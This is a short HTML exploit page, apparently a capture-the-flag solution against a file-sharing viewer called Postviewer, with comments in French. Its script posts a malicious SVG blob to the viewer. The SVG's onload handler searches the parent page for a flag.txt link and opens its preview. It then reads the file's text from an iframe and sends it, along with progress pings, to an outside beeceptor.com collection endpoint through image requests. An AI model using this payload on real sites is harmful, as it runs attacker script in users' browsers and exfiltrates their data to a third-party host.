<html><body><script>
/* ping immédiat : la page GitHub est chargée */
new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';

(async () => {

  /* === 1. fichier SVG avec payload JS dans onload === */
  const svg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"
         onload="
           (async ()=>{
             /* ping : le SVG s’exécute → blob_start */
             new Image().src='https://webtest.free.beeceptor.com/exfil?f=blob_start';

             try{
               const links=[...parent.document.querySelectorAll('a')];
               new Image().src='https://webtest.free.beeceptor.com/exfil?f=links_'+links.length;

               const a=links.find(x=>/flag\\.txt$/.test(x.textContent));
               if(!a){ new Image().src='https://webtest.free.beeceptor.com/exfil?f=not_found'; return; }

               /* on déclenche le rendu du fichier pour qu’il soit accessible */
               parent.location.hash=a.id;
               await new Promise(r=>setTimeout(r,800));

               const iframe=parent.document
                   .querySelector('#previewIframeDiv')
                   .shadowRoot.querySelector('iframe');

               const flag=iframe.contentDocument.body.innerText.trim();
               new Image().src='https://webtest.free.beeceptor.com/exfil?f='+encodeURIComponent(flag);

             }catch(e){
               new Image().src='https://webtest.free.beeceptor.com/exfil?f=error_'+encodeURIComponent(e.message);
             }finally{
               new Image().src='https://webtest.free.beeceptor.com/exfil?f=done';
             }
           })()
         ">
    </svg>`;

  const blob = new Blob([svg], {type:'image/svg+xml'});

  /* === 2. on l’envoie à Postviewer === */
  window.postMessage({
    type:'share',
    files:[{blob, name:'evil.svg', cached:false}]
  }, '*');

  new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
})();
</script></body></html>
